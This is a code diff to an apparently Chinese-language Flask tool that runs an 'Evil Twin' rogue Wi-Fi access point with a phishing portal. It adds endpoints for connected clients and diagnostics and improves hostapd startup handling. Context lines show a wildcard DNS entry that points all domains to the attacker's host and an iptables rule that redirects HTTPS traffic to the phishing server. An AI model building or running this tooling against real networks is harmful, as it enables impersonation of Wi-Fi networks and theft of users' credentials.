@@ -555,6 +555,42 @@ def freq_to_channel(freq):
         return (freq - 5950) // 5  # 6 GHz
     return 0
 
+@app.route('/api/clients')
+def get_clients():
+    """获取已连接客户端列表（dnsmasq leases）"""
+    clients = []
+    try:
+        with open('/var/lib/misc/dnsmasq.leases') as f:
+            for line in f:
+                parts = line.strip().split()
+                if len(parts) >= 4:
+                    clients.append({
+                        'mac': parts[1],
+                        'ip': parts[2],
+                        'hostname': parts[3] if len(parts) > 3 else ''
+                    })
+    except:
+        pass
+    return jsonify({'clients': clients, 'count': len(clients)})
+
+
+@app.route('/api/diag')
+def get_diag():
+    """诊断：hostapd日志、进程状态、已连接设备"""
+    hostapd_log = ''
+    try:
+        with open('/tmp/hostapd.log') as f:
+            hostapd_log = f.read()[-1000:]
+    except:
+        hostapd_log = '(无日志)'
+    
+    return jsonify({
+        'hostapd_running': is_process_running('hostapd'),
+        'dnsmasq_running': is_process_running('dnsmasq'),
+        'hostapd_log': hostapd_log
+    })
+
+
 # ==================== 钓鱼页面 ====================
 
 @app.route('/', defaults={'path': ''})
@@ -686,13 +722,22 @@ address=/#/192.168.4.1
     run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])
 
     # 5. 启动服务
-    subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'], 
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    with open('/tmp/hostapd.log', 'w') as hp_log:
+        subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'],
+                        stdout=hp_log, stderr=subprocess.STDOUT)
     subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    # 6. 启动Flask钓鱼服务器 (如果未运行)
-    subprocess.Popen(['python3', 'app.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    import time
+    time.sleep(1)
+    if not is_process_running('hostapd'):
+        err = ''
+        try:
+            with open('/tmp/hostapd.log') as f:
+                err = f.read()[-500:]
+        except:
+            pass
+        return {'status': 'error', 'message': 'hostapd 启动失败', 'stderr': err}
     
     return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动'}
 
